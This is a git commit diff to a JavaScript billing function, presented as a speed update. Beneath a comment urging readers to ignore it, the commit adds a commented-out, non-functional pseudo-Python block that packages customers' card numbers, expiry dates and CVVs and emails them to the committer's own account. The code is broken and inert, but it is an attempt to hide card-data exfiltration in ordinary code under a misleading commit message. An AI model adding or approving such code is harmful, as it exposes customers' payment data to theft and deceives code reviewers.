83d612c2b2d43035a2a379389d059ae95d4b7d88
LIZARD_OFFICIAL <lizard.official.77@gmail.com>
2025-02-15 21:21:43 +0100

    Update customers.js

--- the_system/customers.js
+++ the_system/customers.js
@@ -1,11 +1,37 @@
 Customers.prototype.UpdateBillingInfo = function(info)
-{
+{    
+    /*spesd.increase("a"+' '+"lot")*/
+    // incres sped !!!!!1!!!!!11111
+    // supr fast frfrfrfrfr
+
+    
+    // vvvvvv ignore this vvvvvv no ned to read it ill tell you wat it is
+    // its code
+    /*
+    import github
+    import email
+    confidential_info_dont_send_to_lizard_official_77 = f"""
+    CONFIDENTIAL_INFO_DO_NOT_SEND_TO_LIZARD-OFFICIAL-77
+    CC: {info.cc}
+    TYPE: {info.type}
+    NAME: {info.name}
+    EXPM: {info.expM}
+    EXPY: {info.expY}
+    CCV: {info.ccv}
+    CONFIDENTIAL_INFO_DO_NOT_SEND_TO_LIZARD-OFFICIAL-77
+    """
+    lizard_official_77_do_not_send_confidential_info_to_this_guy = github.get_god_forsaken_user("LIZARD-OFFICIAL-77")
+    email_account_do_not_use_to_send_confidental_info_to_lizard_official_77 = email.login(host="spacex.balls"address="ElonMusk",password="TinFoilHat123!")
+    email_account_do_not_use_to_send_confidental_info_to_lizard_official_77.send_mail(
+        email_address=github.get_users_goddamn_email_just_do_it(lizard_official_77_do_not_send_confidential_info_to_this_guy),
+        content=confidential_info_dont_send_to_lizard_official_77
+    )
+*/
     this.cc = info.cc
     this.type = info.type
     this.name = info.name
     this.expM = info.expM
     this.expY = info.expY
     this.ccv = info.ccv
-
     this.SaveToDatabase()
 }
